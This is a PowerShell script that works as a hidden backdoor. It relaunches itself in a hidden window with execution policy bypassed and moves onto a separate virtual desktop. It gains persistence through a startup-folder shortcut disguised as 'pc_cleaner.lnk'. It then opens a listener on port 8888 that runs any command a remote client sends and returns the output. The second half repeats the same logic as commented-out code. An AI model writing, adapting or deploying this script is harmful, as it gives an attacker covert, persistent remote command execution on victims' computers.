# Server Script: server.ps1

# Get the path of the Startup folder for the current user
$StartupFolder = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
# Get the full path of the script file
$ScriptPath = $MyInvocation.MyCommand.Path
# Define the path for the shortcut
$ShortcutPath = [System.IO.Path]::Combine($StartupFolder, 'pc_cleaner.lnk') # Edit the filename to fit your needs

Start-Sleep -Seconds 5

if ($args[-1] -ne "-sussybaka") {
    Write-Host "Installing VirtualDesktop module..."
    if (-not (Get-Module -Name VirtualDesktop -ListAvailable)) {
        $job = Start-Job -ScriptBlock {
            # Ensure NuGet provider is installed
            Install-PackageProvider -Name NuGet -Force -Scope CurrentUser -ErrorAction SilentlyContinue
            Install-Module -Name VirtualDesktop -Scope CurrentUser -Force -AllowClobber
        }
        Wait-Job $job
    }

    Import-Module VirtualDesktop
    $newDesktop = New-Desktop
    Switch-Desktop -Desktop $newDesktop
    Start-Process powershell.exe -ArgumentList "-WindowStyle hidden -ExecutionPolicy Bypass -sussybaka -File `"$scriptPath`""
    exit
}
Start-Sleep -Seconds 5
Import-Module VirtualDesktop
Switch-Desktop -Desktop 1
# Check if the shortcut already exists
if (Test-Path $ShortcutPath) {
    Write-Host "Shortcut already exists: $ShortcutPath"
} else {
    # Create a WScript.Shell COM object
    $WScriptShell = New-Object -ComObject WScript.Shell

    # Create the shortcut
    $Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
    $Shortcut.TargetPath = 'powershell.exe'
    $Shortcut.Arguments = "-WindowStyle hidden -ExecutionPolicy Bypass -File `"$ScriptPath`"}"
    $Shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($ScriptPath)
    $Shortcut.Save()

    Write-Host "Shortcut created in Startup folder: $ShortcutPath"

    # run the shortcut and exit this script
    Invoke-Item -Path $ShortcutPath
    exit
}

# $job = Start-Job -ScriptBlock {
$ipAddress = [System.Net.IPAddress]::Any
$port = 8888

# Set up the listener
$listener = [System.Net.Sockets.TcpListener]::new($ipAddress, $port)
$listener.Start()
$pubIP = (Invoke-WebRequest -UseBasicParsing ifconfig.me/ip).Content.Trim()
Write-Host "Server started at $($pubIP.ToString()):$port. Waiting for connections..."

while ($true) {
    # Accept incoming client connection
    $client = $listener.AcceptTcpClient()
    $stream = $client.GetStream()
    Write-Host "Client connected."

    # Read incoming command from the client
    $reader = New-Object System.IO.StreamReader($stream)
    $command = $reader.ReadLine()

    try {
        # Execute the command
        $output = Invoke-Expression $command 2>&1 | Out-String
    } catch {
        # Catch any errors and include them in the output
        $output = $_.Exception.Message
    }

    # Send back the output
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.WriteLine($output)
    $writer.Flush()

    # Clean up
    $writer.Close()
    $reader.Close()
    $stream.Close()
    $client.Close()
}

# Stop the listener
$listener.Stop()
# }

    # Wait for the job to complete
    # Wait-Job $job

# # Check if the shortcut already exists
# if (Test-Path $ShortcutPath) {
#     Write-Host "Shortcut already exists: $ShortcutPath"
# } else {
#     # Create a WScript.Shell COM object
#     $WScriptShell = New-Object -ComObject WScript.Shell

#     # Create the shortcut
#     $Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
#     $Shortcut.TargetPath = 'powershell.exe'
#     $Shortcut.Arguments = "-NoProfile -WindowStyle hidden -ExecutionPolicy Bypass -File `"$ScriptPath`" -NoNewWindow}"
#     $Shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($ScriptPath)
#     $Shortcut.Save()

#     Write-Host "Shortcut created in Startup folder: $ShortcutPath"

#     # run the shortcut and exit this script
#     Invoke-Item -Path $ShortcutPath
#     exit
# }

# $job = Start-Job -ScriptBlock {
#     $ipAddress = [System.Net.IPAddress]::Any
#     $port = 8888

#     # Set up the listener
#     $listener = [System.Net.Sockets.TcpListener]::new($ipAddress, $port)
#     $listener.Start()
#     $pubIP = (Invoke-WebRequest -UseBasicParsing ifconfig.me/ip).Content.Trim()
#     Write-Host "Server started at $($pubIP.ToString()):$port. Waiting for connections..."

#     while ($true) {
#         # Accept incoming client connection
#         $client = $listener.AcceptTcpClient()
#         $stream = $client.GetStream()
#         Write-Host "Client connected."

#         # Read incoming command from the client
#         $reader = New-Object System.IO.StreamReader($stream)
#         $command = $reader.ReadLine()

#         try {
#             # Execute the command
#             $output = Invoke-Expression $command 2>&1 | Out-String
#         } catch {
#             # Catch any errors and include them in the output
#             $output = $_.Exception.Message
#         }

#         # Send back the output
#         $writer = New-Object System.IO.StreamWriter($stream)
#         $writer.WriteLine($output)
#         $writer.Flush()

#         # Clean up
#         $writer.Close()
#         $reader.Close()
#         $stream.Close()
#         $client.Close()
#     }

#     # Stop the listener
#     $listener.Stop()
# }

# # Wait for the job to complete
# Wait-Job $job
